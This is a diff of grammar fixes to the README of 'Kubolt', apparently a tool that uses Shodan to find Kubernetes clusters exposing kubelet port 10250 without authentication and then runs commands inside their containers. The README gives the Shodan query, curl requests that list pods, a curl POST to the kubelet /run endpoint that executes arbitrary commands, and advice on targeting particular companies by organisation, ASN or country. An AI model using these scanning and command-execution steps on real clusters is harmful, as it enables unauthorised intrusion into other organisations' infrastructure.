@@ -1,8 +1,8 @@
 # Wat?
-**Kubolt** is simple utility to scan public unauthinticated kubernetes clusters and run commands inside containers
+**Kubolt** is simple utility for scanning public unauthinticated kubernetes clusters and run commands inside containers
 
 # Why?
-If the cluster exposed port 10250 to internet it's possible to use getrun function from [kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go) and run commands inside containers:
+Sometimes, the kubelet port 10250 is open to unauthorized access and makes it possible to run commands inside the containers using getrun function from [kubelet](https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/server/server.go):
 ```go
 // getRun handles requests to run a command inside a container.
 func (s *Server) getRun(request *restful.Request, response *restful.Response) {
@@ -19,7 +19,7 @@ Okay, let's ask our friend Shodan :trollface:
 The basic query is 
 >ssl:true port:10250 404 
 
-**Kubelet** use port 10250 with SSL by default, 404 is the HTTP response without URL path. 
+**Kubelet** uses port 10250 with SSL by default, 404 is the HTTP response without URL path. 
 
 **Kubolt** ask Shodan by API for list of IP addresses and keep them for other OSINT actions :grin:
 
@@ -29,7 +29,7 @@ curl -k https://IP-from-Shodan:10250/runningpods/
 ```
 Anyway, if you find the host without any running pods at the time, keep it for next time when pods might be started :grin: 
 
-You could list all the available pods from these requests:
+You can list all the available pods from these requests:
 ```bash
 curl -k https://IP-from-Shodan:10250/pods/
 #or
@@ -40,7 +40,7 @@ Next **kubolt** parse response and generate a new request as below:
 ```bash
 curl -XPOST -k https://IP-from-Shodan:10250/run/<namespace>/<PodName>/<containerName> -d "cmd=<command-to-run>" 
 ```
-You could target companies more accurate using Shodan filters like this:
+You can target companies more accurate using Shodan filters such as:
 - asn
 - org
 - country
@@ -60,7 +60,7 @@ python kubolt.py --query "org:'ACME Corporation' country:UK"
 ```
 
 # Shodan 
-**Kubolt** use Shodan API and [Query Credits](https://help.shodan.io/the-basics/credit-types-explained) accordingly, if you run the tool without query filters then you will probably fire all your credits `¯\_(ツ)_/¯`  
+**Kubolt** uses Shodan API and [Query Credits](https://help.shodan.io/the-basics/credit-types-explained) accordingly, if you run the tool without query filters then you will probably fire all your credits `¯\_(ツ)_/¯`  
 
 # Demo
 ![demo](/github-scale.gif)
